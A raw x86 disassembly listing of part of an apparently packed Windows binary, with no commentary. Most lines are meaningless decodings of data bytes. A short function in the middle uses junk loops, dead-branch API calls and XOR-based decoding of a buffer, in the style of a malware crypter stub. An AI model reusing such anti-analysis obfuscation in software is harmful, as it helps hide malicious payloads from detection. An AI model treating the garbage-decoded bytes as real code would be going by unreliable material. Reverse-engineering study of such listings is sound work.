  40fc5a:	push   ebx
  40fc5b:	pop    es
  40fc5c:	sahf   
  40fc5d:	or     al,BYTE PTR [ebx+0x22cf0d28]
  40fc63:	push   ss
  40fc64:	pop    ecx
  40fc65:	pop    esp
  40fc66:	bswap  esi
  40fc68:	rcr    BYTE PTR [esp+edx*4],0xf9
  40fc6c:	add    DWORD PTR [eax-0x2e068d78],esp
  40fc72:	jg     0x40fbf6
  40fc74:	mov    ebp,0x9dc01dff
  40fc79:	neg    cl
  40fc7b:	das    
  40fc7c:	stos   BYTE PTR es:[edi],al
  40fc7d:	sbb    BYTE PTR [ebx+ebx*1],al
  40fc80:	addr16 dec edx
  40fc82:	mov    ds:0x3dfbca29,eax
  40fc88:	out    dx,al
  40fc89:	push   ds
  40fc8a:	adc    DWORD PTR [esi+0x6a],edi
  40fc8d:	cvttpd2pi mm0,XMMWORD PTR [esi+0x2a390686]
  40fc95:	push   eax
  40fc96:	jecxz  0x40fcc8
  40fc98:	out    dx,al
  40fc99:	ret    
  40fc9a:	es je  0x40fca8
  40fc9d:	sbb    BYTE PTR [eax-0x20],ah
  40fca0:	rcr    BYTE PTR [edi+0x3dd4fc5e],cl
  40fca6:	xor    ah,BYTE PTR [edx+0x6c40577a]
  40fcac:	lds    esp,FWORD PTR [ebx-0x7b]
  40fcaf:	mov    edx,0xa8b8e63
  40fcb4:	cli    
  40fcb5:	sbb    eax,0xe30b4564
  40fcba:	adc    al,0x1a
  40fcbc:	mov    esi,0xedefa689
  40fcc1:	outs   dx,DWORD PTR ds:[esi]
  40fcc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc3:	dec    ebx
  40fcc4:	inc    BYTE PTR [edx-0x4f]
  40fcc7:	xchg   ebx,eax
  40fcc8:	aad    0x4e
  40fcca:	add    DWORD PTR [esi],edx
  40fccc:	sub    eax,0x68fa3bf9
  40fcd1:	mov    ds:0x2b05f04c,eax
  40fcd6:	inc    edx
  40fcd7:	ja     0x40fcdc
  40fcd9:	in     al,0x26
  40fcdb:	fimul  DWORD PTR [edi+ebp*4-0x66]
  40fcdf:	mov    eax,0x6fd0ddc0
  40fce4:	es test al,0xfc
  40fce7:	fdivr  QWORD PTR [edi+eiz*8+0x29]
  40fceb:	add    al,0xd7
  40fced:	ins    DWORD PTR es:[edi],dx
  40fcee:	mov    WORD PTR [edx+0xe],?
  40fcf1:	sub    BYTE PTR [esi+ebx*1-0x2fa729d2],0x62
  40fcf9:	mov    gs,esp
  40fcfb:	lods   al,BYTE PTR ds:[esi]
  40fcfc:	cs jmp 0x8fa3d3d9
  40fd02:	pop    edx
  40fd03:	cmp    esi,DWORD PTR [ebx+0x7b]
  40fd06:	pop    edx
  40fd07:	lods   al,BYTE PTR ds:[esi]
  40fd08:	ficom  DWORD PTR [esi]
  40fd0a:	or     dh,BYTE PTR [ebp+0x11]
  40fd0d:	adc    BYTE PTR [eax+0x2152bf19],0xfe
  40fd14:	xchg   esi,eax
  40fd15:	cmp    ebp,DWORD PTR [ecx]
  40fd17:	sbb    al,0xb3
  40fd19:	inc    edx
  40fd1a:	mov    cl,0xe
  40fd1c:	sbb    dh,BYTE PTR ds:0xd3ed50d6
  40fd22:	adc    dl,bl
  40fd24:	data16 jne 0x40fd6e
  40fd27:	pop    esp
  40fd28:	out    0xaf,al
  40fd2a:	dec    ebp
  40fd2b:	xor    ah,bl
  40fd2d:	aad    0x22
  40fd2f:	int    0x1b
  40fd31:	call   0xd149:0xa9beef8a
  40fd38:	iret   
  40fd39:	inc    edi
  40fd3a:	mov    al,0xa8
  40fd3c:	je     0x40fd32
  40fd3e:	inc    ecx
  40fd3f:	in     eax,0xae
  40fd41:	pushf  
  40fd42:	iret   
  40fd43:	test   DWORD PTR [edi-0x3],esp
  40fd46:	inc    BYTE PTR [ebx]
  40fd48:	or     eax,0x82467338
  40fd4d:	sub    bh,BYTE PTR [ebx]
  40fd4f:	and    eax,0x7c403cc
  40fd54:	cmp    eax,0x9f8dec54
  40fd59:	xchg   ch,al
  40fd5b:	jle    0x40fd5d
  40fd5d:	add    ch,ah
  40fd5f:	mov    bh,0xe8
  40fd61:	dec    ebp
  40fd62:	xor    DWORD PTR [edx+0x4f7161a8],ebx
  40fd68:	sub    dh,0x43
  40fd6b:	xchg   DWORD PTR [ebp-0x52],eax
  40fd6e:	cmc    
  40fd6f:	xchg   edx,eax
  40fd70:	xor    edx,DWORD PTR [edx]
  40fd72:	je     0x40fda0
  40fd74:	jp     0x40fdc0
  40fd76:	jno    0x40fd14
  40fd78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd79:	lock das 
  40fd7b:	inc    edi
  40fd7c:	stos   BYTE PTR es:[edi],al
  40fd7d:	dec    edi
  40fd7e:	sub    al,0x56
  40fd80:	(bad)
  40fd84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd85:	iret   
  40fd86:	inc    esp
  40fd87:	loope  0x40fd6f
  40fd89:	jmp    ecx
  40fd8b:	mov    al,0x3a
  40fd8d:	int    0xe0
  40fd8f:	stos   BYTE PTR es:[edi],al
  40fd90:	xchg   bh,ch
  40fd92:	adc    al,0x52
  40fd94:	inc    edi
  40fd95:	add    eax,0x5d742123
  40fd9a:	sub    BYTE PTR [ebx-0x349a2ee5],ah
  40fda0:	xchg   ecx,eax
  40fda1:	ror    BYTE PTR [ebx-0x3f7b6aa6],1
  40fda7:	pop    ds
  40fda8:	xlat   BYTE PTR ds:[ebx]
  40fda9:	push   edi
  40fdaa:	loope  0x40fe20
  40fdac:	adc    BYTE PTR [ecx-0x459aba87],ch
  40fdb2:	cmp    al,0xa
  40fdb4:	cld    
  40fdb5:	mov    es,WORD PTR cs:[esi]
  40fdb8:	inc    edi
  40fdb9:	jno    0x40fdc3
  40fdbb:	xor    al,0xfe
  40fdbd:	jecxz  0x40fdcb
  40fdbf:	mov    BYTE PTR [ebp+esi*1-0x262e7708],dh
  40fdc6:	pop    ebp
  40fdc7:	mov    edi,0x793dc487
  40fdcc:	xchg   DWORD PTR [ebp+0x79],edx
  40fdcf:	adc    DWORD PTR [edi-0x3a9e1e2b],ecx
  40fdd5:	stos   DWORD PTR es:[edi],eax
  40fdd6:	xor    al,0x37
  40fdd8:	add    ecx,DWORD PTR [ecx-0x63]
  40fddb:	sar    BYTE PTR [ebx+0x155b3579],cl
  40fde1:	mov    ds:0x59006e2b,al
  40fde6:	emms   
  40fde8:	fs pushf 
  40fdea:	ror    BYTE PTR [edi+0x52ba80f2],1
  40fdf0:	call   0x45ca950e
  40fdf5:	dec    edi
  40fdf6:	jb     0x40fe43
  40fdf8:	outs   dx,DWORD PTR ds:[esi]
  40fdf9:	gs loope 0x40fe29
  40fdfc:	pusha  
  40fdfd:	adc    BYTE PTR [edi],al
  40fdff:	nop
  40fe00:	enter  0x6684,0x41
  40fe04:	add    dh,0x7e
  40fe07:	mov    eax,0x1a03a81c
  40fe0c:	mov    ebx,0x52215fc1
  40fe11:	push   0x28
  40fe13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe14:	aas    
  40fe15:	and    cl,dh
  40fe17:	add    DWORD PTR [eax+eax*8-0xaac4b88],0x24
  40fe1f:	sub    edx,eax
  40fe21:	jl     0x40fe70
  40fe23:	dec    edi
  40fe24:	push   ss
  40fe25:	int3   
  40fe26:	stos   DWORD PTR es:[edi],eax
  40fe27:	into   
  40fe28:	push   eax
  40fe29:	mov    bl,BYTE PTR [edx]
  40fe2b:	xchg   DWORD PTR [ecx],ebp
  40fe2d:	xrelease mov DWORD PTR ds:[ecx+0x6f],ecx
  40fe32:	data16 sub BYTE PTR [edx+0x785b6b54],dh
  40fe39:	nop
  40fe3a:	outs   dx,BYTE PTR ds:[esi]
  40fe3b:	test   esi,ecx
  40fe3d:	pusha  
  40fe3e:	lock xor dl,BYTE PTR [edx-0x5b1fc476]
  40fe45:	and    edi,DWORD PTR [edi]
  40fe47:	pmulhuw mm4,QWORD PTR [esi-0x47]
  40fe4b:	mov    DWORD PTR [edx+0x14],ebx
  40fe4e:	xchg   ebp,eax
  40fe4f:	and    BYTE PTR [edi-0x6fce9341],bl
  40fe55:	dec    ecx
  40fe56:	daa    
  40fe57:	jb     0x40fe34
  40fe59:	pop    ebp
  40fe5a:	inc    esp
  40fe5b:	adc    edx,DWORD PTR [edx-0x209662e8]
  40fe61:	ror    DWORD PTR [esi+0x1b],1
  40fe64:	jmp    0xecfe:0xd2781442
  40fe6b:	nop
  40fe6c:	or     ecx,ebp
  40fe6e:	je     0x40feae
  40fe70:	mov    WORD PTR [ebp-0xc798ede],?
  40fe76:	mov    dl,0xdc
  40fe78:	pop    es
  40fe79:	and    BYTE PTR [edx],ch
  40fe7b:	lahf   
  40fe7c:	outs   dx,BYTE PTR ds:[esi]
  40fe7d:	cwde   
  40fe7e:	push   esp
  40fe7f:	loopne 0x40fe87
  40fe81:	sub    al,0x95
  40fe83:	test   eax,0x444d4cdf
  40fe88:	dec    edi
  40fe89:	adc    BYTE PTR [esp+ecx*1-0x5d8248ce],0xf1
  40fe91:	push   esi
  40fe92:	sub    cl,BYTE PTR [edi-0x772b07d5]
  40fe98:	cmp    al,0xc8
  40fe9a:	ja     0x40fe20
  40fe9c:	sbb    ah,BYTE PTR [eax]
  40fe9e:	pop    es
  40fe9f:	xchg   edi,eax
  40fea0:	jle    0x40fecb
  40fea2:	popa   
  40fea3:	int3   
  40fea4:	mov    edi,0x4af94cc9
  40fea9:	pop    ds
  40feaa:	mov    esi,0x54ebd4c4
  40feaf:	mov    ebp,0x2846cfa8
  40feb4:	sbb    ecx,DWORD PTR [ebx]
  40feb6:	push   ebp
  40feb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb8:	cld    
  40feb9:	nop
  40feba:	fld    TBYTE PTR [eax+0x7a]
  40febd:	cs cli 
  40febf:	hlt    
  40fec0:	lds    esp,FWORD PTR [edx]
  40fec2:	mov    ch,0xb6
  40fec4:	push   eax
  40fec5:	ins    DWORD PTR es:[edi],dx
  40fec6:	aad    0x77
  40fec8:	test   DWORD PTR [ebx+ecx*4-0x4f],edx
  40fecc:	or     ebx,DWORD PTR [edi+eax*1+0x55]
  40fed0:	sub    eax,0xdf2355cd
  40fed5:	inc    ebx
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x632d4346
  40fef3:	pop    ss
  40fef4:	and    eax,0x7e7eb5de
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	add    eax,0x488e1750
  40ff02:	aam    0xbe
  40ff04:	mov    esp,0x3e88047b
  40ff09:	in     eax,0x31
  40ff0b:	imul   ebx,DWORD PTR [edi+edi*1],0x12834204
  40ff12:	lods   eax,DWORD PTR ds:[esi]
  40ff13:	ins    BYTE PTR es:[edi],dx
  40ff14:	das    
  40ff15:	fdiv   DWORD PTR [esi]
  40ff17:	inc    ebx
  40ff18:	xor    DWORD PTR [esi-0xd14b80],esi
  40ff1e:	jne    0x40feb5
  40ff20:	mov    fs,WORD PTR [eax+0x6b21ef62]
  40ff26:	(bad)  
  40ff27:	out    0xbe,eax
  40ff29:	adc    esp,DWORD PTR [edx+0x4d4f69a1]
  40ff2f:	les    ebx,FWORD PTR [ebx-0x6abf08b4]
  40ff35:	xor    DWORD PTR [ecx],ebx
  40ff37:	jge    0x40ff77
  40ff39:	ret    0x9ce9
  40ff3c:	push   ss
  40ff3d:	scas   eax,DWORD PTR es:[edi]
  40ff3e:	sub    al,0x5c
  40ff40:	sbb    DWORD PTR [edx+edx*2],edi
  40ff43:	scas   eax,DWORD PTR es:[edi]
  40ff44:	mov    ch,0x4f
  40ff46:	(bad)  
  40ff47:	rcl    ah,0x1e
  40ff4a:	push   ds
  40ff4b:	fldcw  WORD PTR [edi+edi*4-0x1a]
  40ff4f:	xor    ecx,0xddb216b
  40ff55:	push   ds
  40ff56:	stc    
  40ff57:	inc    ebx
  40ff58:	sub    BYTE PTR [eax-0x3a177d5d],al
  40ff5e:	xchg   al,dh
  40ff60:	jp     0x40ff57
  40ff62:	pop    es
  40ff63:	mov    ds:0xbd614ff2,eax
  40ff68:	fstp   TBYTE PTR [edx+0x70]
  40ff6b:	jno    0x40fef1
  40ff6d:	lods   eax,DWORD PTR ds:[esi]
  40ff6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff6f:	shl    DWORD PTR [edi],0x82
  40ff72:	mov    dl,0xdf
  40ff74:	mov    es,WORD PTR [eax+ebx*2]
  40ff77:	retf   
  40ff78:	(bad)  
  40ff79:	loopne 0x40ffb6
  40ff7b:	xor    eax,0xbf328642
  40ff80:	ret    0xe652
  40ff83:	sahf   
  40ff84:	lahf   
  40ff85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff86:	push   ebx
  40ff87:	je     0x40ff5e
  40ff89:	fwait
  40ff8a:	mov    ah,0xe6
  40ff8c:	sub    al,bh
  40ff8e:	adc    edi,esi
  40ff90:	mov    dl,0x26
  40ff92:	stc    
  40ff93:	aas    
  40ff94:	in     al,dx
  40ff95:	in     eax,dx
  40ff96:	and    DWORD PTR ds:0xebb68e54,0x22eb90af
  40ffa0:	hlt    
  40ffa1:	pushf  
  40ffa2:	pop    ebp
  40ffa3:	or     DWORD PTR [edx-0x65],ebx
  40ffa6:	and    al,0x0
  40ffa8:	sbb    eax,0xc9a36836
  40ffad:	adc    eax,0x7443582
  40ffb2:	adc    eax,0xd296048d
  40ffb7:	sub    ebx,esp
  40ffb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffba:	mov    eax,0xac51a07b
  40ffbf:	outs   dx,DWORD PTR ds:[esi]
  40ffc0:	inc    edi
  40ffc1:	sbb    edi,DWORD PTR ds:[esi]
  40ffc4:	cmp    al,0x5f
  40ffc6:	mov    ebx,0xe922bbd
  40ffcb:	sbb    al,0xd9
  40ffcd:	jge    0x40ffc6
  40ffcf:	add    eax,0xece8b19f
  40ffd4:	xor    DWORD PTR [edi-0x291b266],esi
  40ffda:	fistp  DWORD PTR es:[ecx+ebp*1+0x7082e04d]
  40ffe2:	push   ebx
  40ffe3:	cwde   
  40ffe4:	fstp   DWORD PTR [eax]
  40ffe6:	dec    eax
  40ffe7:	inc    ebp
  40ffe8:	mov    al,ds:0xabd696f6
  40ffed:	fnstcw WORD PTR [eax]
  40ffef:	cmp    cl,BYTE PTR ds:0x60329a1b
  40fff5:	pusha  
  40fff6:	fisub  WORD PTR [edi+0x14]
  40fff9:	dec    ecx
  40fffa:	pop    edi
  40fffb:	cmp    ah,bl
  40fffd:	dec    ebx
  40fffe:	xlat   BYTE PTR ds:[ebx]
  40ffff:	jg     0x40ff98
  410001:	into   
  410002:	iret   
  410003:	not    BYTE PTR [eax+0x5345b928]
  410009:	ret    
  41000a:	jmp    ecx
  41000c:	test   DWORD PTR ds:[edi-0x48],esi
  410010:	out    0xee,al
  410012:	sub    DWORD PTR [edx-0x43f1e5ea],esi
  410018:	xor    al,0x8a
  41001a:	pop    ss
  41001b:	stos   BYTE PTR es:[edi],al
  41001c:	xlat   BYTE PTR ds:[ebx]
  41001d:	pop    edx
  41001e:	and    eax,0xe8ce0a0
  410023:	inc    ebp
  410024:	mov    bl,0x17
  410026:	push   cs
  410027:	mov    eax,fs
  410029:	mov    DWORD PTR [ebx+0x1f],ecx
  41002c:	ds out 0xf5,eax
  41002f:	cli    
  410030:	jge    0x40fffc
  410032:	push   0x17e0bbdb
  410037:	xchg   esi,eax
  410038:	xchg   BYTE PTR [edx+0x31078dcd],ch
  41003e:	mov    fs,WORD PTR [ebx+esi*2-0x6722b98]
  410045:	fist   WORD PTR [ebp+0x6008cc4c]
  41004b:	test   al,0xf1
  41004d:	pop    edi
  41004e:	xchg   BYTE PTR [ebx+edi*2],ch
  410051:	adc    DWORD PTR [esi],edx
  410053:	test   DWORD PTR [eax+0x32],ebp
  410056:	push   ss
  410057:	dec    esi
  410058:	aad    0xd8
  41005a:	jge    0x410027
  41005c:	in     eax,0x63
  41005e:	sbb    esp,DWORD PTR [esi+0x392af2f0]
  410064:	or     eax,0x521c3816
  410069:	inc    ebp
  41006a:	jge    0x410017
  41006c:	push   ds
  41006d:	cmp    ebp,DWORD PTR [ecx-0x6a]
  410070:	arpl   WORD PTR [ecx],ax
  410072:	sub    al,0x4b
  410074:	mov    al,ds:0x487b4090
  410079:	rol    ebp,cl
  41007b:	ret    0x3b10
  41007e:	test   al,0x47
  410080:	adc    DWORD PTR [edi-0xf],esp
  410083:	jo     0x4100c6
  410085:	shl    DWORD PTR [esi],1
  410087:	bound  esi,QWORD PTR [ecx-0x39]
  41008a:	ret    0x9625
  41008d:	repnz fisttp DWORD PTR [edi-0x650eeed2]
  410094:	adc    eax,0xdcb106e5
  410099:	lods   eax,DWORD PTR ds:[esi]
  41009a:	pop    ds
  41009b:	jb     0x41002d
  41009d:	inc    edx
  41009e:	cmp    al,0x89
  4100a0:	(bad)  
  4100a1:	enter  0x22fb,0x40
  4100a5:	inc    edi
  4100a6:	pop    ds
  4100a7:	stos   DWORD PTR es:[edi],eax
  4100a8:	cli    
  4100a9:	sub    eax,0x2b43bb61
  4100ae:	rcr    ebp,cl
  4100b0:	pop    esp
  4100b1:	stos   DWORD PTR es:[edi],eax
  4100b2:	loop   0x41012e
  4100b4:	ror    BYTE PTR [edx],0x45
  4100b7:	jns    0x410114
  4100b9:	inc    esi
  4100ba:	dec    edx
  4100bb:	les    ecx,FWORD PTR ds:[eax]
  4100be:	test   BYTE PTR [edx+0x5b],dh
  4100c1:	ror    BYTE PTR [edi],cl
  4100c3:	cdq    
  4100c4:	jae    0x41007c
  4100c6:	jmp    0x228b2440
  4100cb:	lea    esi,[edx]
  4100cd:	scas   al,BYTE PTR es:[edi]
  4100ce:	xchg   edx,eax
  4100cf:	pusha  
  4100d0:	mov    ah,BYTE PTR [ebx]
  4100d2:	adc    DWORD PTR [ecx+0x57e64dd7],esp
  4100d8:	jo     0x4100ee
  4100da:	daa    
  4100db:	mov    WORD PTR [ebp-0x64bf2342],?
  4100e1:	push   ebp
  4100e2:	and    esi,DWORD PTR [ecx-0x297f96af]
  4100e8:	mov    eax,ds:0xbc24110
  4100ed:	fidiv  DWORD PTR [eax+0x68]
  4100f0:	inc    ebp
  4100f1:	leave  
  4100f2:	rol    esi,cl
  4100f4:	in     eax,dx
  4100f5:	xor    DWORD PTR [esp+esi*4],edx
  4100f8:	cli    
  4100f9:	dec    esp
  4100fa:	lds    edi,FWORD PTR [ebx]
  4100fc:	pop    es
  4100fd:	add    eax,0x43199fcb
  410102:	push   ecx
  410103:	nop
  410104:	(bad)  
  410105:	retf   
  410106:	std    
  410107:	test   eax,0x9ffc27b5
  41010c:	cmp    BYTE PTR [edi-0x54],ch
  41010f:	outs   dx,DWORD PTR ds:[esi]
  410110:	call   0x8bca31bd
  410115:	mov    ecx,0x46912af3
  41011a:	mov    ds:0xf6de7a9e,eax
  41011f:	sub    dh,BYTE PTR [ecx+0x6a]
  410122:	and    BYTE PTR [ecx],cl
  410124:	jmp    0x410190
  410126:	inc    eax
  410127:	jbe    0x4100b5
  410129:	sbb    DWORD PTR [edi],0x46
  41012c:	rcr    edi,0xf8
  41012f:	sbb    bl,0x83
  410132:	clc    
  410133:	pop    edx
  410134:	inc    edi
  410135:	fnstcw WORD PTR [eax-0xb]
  410138:	or     BYTE PTR ds:0x93624883,0x70
  41013f:	call   0xc4704ac6
  410144:	pop    ecx
  410145:	(bad)  
  410147:	xchg   ecx,eax
  410148:	pushf  
  410149:	xor    esp,DWORD PTR [eax+0x4a]
  41014c:	stos   BYTE PTR es:[edi],al
  41014d:	fcmovnbe st,st(0)
  41014f:	jecxz  0x4101c1
  410151:	pop    ecx
  410152:	push   0x53
  410154:	sbb    bl,BYTE PTR [eax]
  410156:	xor    ebx,esi
  410158:	repnz out dx,al
  41015a:	cmp    ecx,DWORD PTR [ebx+0x24]
  41015d:	adc    bl,ah
  41015f:	stc    
  410160:	cmp    esp,ecx
  410162:	jno    0x410132
  410164:	jae    0x410146
  410166:	clc    
  410167:	dec    ecx
  410168:	call   0xf5056f7e
  41016d:	imul   DWORD PTR [ebp-0x6d4a0f70]
  410173:	popa   
  410174:	mov    ?,WORD PTR [ecx+0x2f]
  410177:	std    
  410178:	ins    BYTE PTR es:[edi],dx
  410179:	adc    DWORD PTR [ebp-0x255a8c5e],ebx
  41017f:	out    dx,eax
  410180:	(bad)  [esp+ebp*4-0x25841e8d]
  410187:	stos   BYTE PTR es:[edi],al
  410188:	ins    DWORD PTR es:[edi],dx
  410189:	xchg   ebx,eax
  41018a:	in     eax,0xdc
  41018c:	cmp    BYTE PTR [ebx],ah
  41018e:	(bad)  
  41018f:	repz (bad) 
  410191:	jmp    0x6bea6e50
  410196:	rcl    DWORD PTR [edx-0xf],0x47
  41019a:	xor    eax,0x54f80f4a
  41019f:	sub    al,0x23
  4101a1:	jmp    0xb119e159
  4101a6:	pop    es
  4101a7:	ret    0xd514
  4101aa:	stos   DWORD PTR es:[edi],eax
  4101ab:	xchg   DWORD PTR [ecx],edx
  4101ad:	push   0x3c
  4101af:	popa   
  4101b0:	xchg   ebp,eax
  4101b1:	inc    ecx
  4101b2:	in     eax,dx
  4101b3:	ror    DWORD PTR [esi],cl
  4101b5:	pop    ds
  4101b6:	dec    edx
  4101b7:	mov    BYTE PTR [eax],al
  4101b9:	mov    esp,0x35063e9a
  4101be:	aas    
  4101bf:	sbb    DWORD PTR [ebx+0x57],0x1b91dc57
  4101c6:	or     dh,BYTE PTR [ebp+0x554a1449]
  4101cc:	cmp    eax,0x72d5a5f5
  4101d1:	aad    0xee
  4101d3:	popa   
  4101d4:	test   edi,ebx
  4101d6:	shl    esi,cl
  4101d8:	pop    esi
  4101d9:	xchg   ebx,eax
  4101da:	jb     0x41016d
  4101dc:	push   esi
  4101dd:	lods   eax,DWORD PTR ds:[esi]
  4101de:	push   es
  4101df:	jmp    0xfedc4020
  4101e4:	retf   
  4101e5:	pushf  
  4101e6:	mov    esi,0xc68944
  4101eb:	add    al,0xae
  4101ed:	jmp    0x41019f
  4101ef:	les    edi,FWORD PTR [ecx]
  4101f1:	dec    esp
  4101f2:	test   eax,0x3237bfb2
  4101f7:	imul   edi,DWORD PTR [ecx],0x5fa6c642
  4101fd:	sti    
  4101fe:	jmp    0x4dccf3fa
  410203:	adc    BYTE PTR [ebx],ah
  410205:	enter  0xc981,0x8f
  410209:	sbb    eax,0xc18b8116
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43371f
  41021e:	adc    DWORD PTR ds:0x433757,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43368b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4337ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43375f
  41026b:	or     DWORD PTR ds:0x433757,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43372b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43372b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43372b,ecx
  410291:	cmp    DWORD PTR ds:0x43372b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43372b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43372b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43372b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43372b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433683
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433767,0x43371f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433763,0x433717
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4336d7
  41031a:	sub    DWORD PTR ds:0x43369f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4336db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4336db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4336db,ecx
  410345:	cmp    DWORD PTR ds:0x4336db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43382f
  410357:	push   0x43386f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4336db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43371f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433793,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433793
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433793,ecx
  41038f:	cmp    DWORD PTR ds:0x433793,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433767
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433793,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433793
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433793,ecx
  4103c8:	cmp    DWORD PTR ds:0x433793,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4336df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4336d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4336d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4336d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4336d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4336d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xf4,al
  41049c:	outs   dx,BYTE PTR ds:[esi]
  41049d:	lock jle 0x41047c
  4104a0:	mov    al,0x7e
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x4104f1
  4104a8:	mov    bl,0xbc
  4104aa:	inc    ecx
  4104ab:	fld    QWORD PTR [esi+eiz*1+0x35]
  4104af:	cmp    ch,BYTE PTR [ebx]
  4104b1:	lods   al,BYTE PTR ds:[esi]
  4104b2:	mov    dh,0xe0
  4104b4:	pop    ebx
  4104b5:	push   ecx
  4104b7:	iret   
  4104b8:	mov    eax,ds:0xdae5b360
  4104bd:	(bad)
  4104c2:	pop    ebp
  4104c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104c4:	test   ebp,edi
  4104c6:	sbb    cl,BYTE PTR [edx]
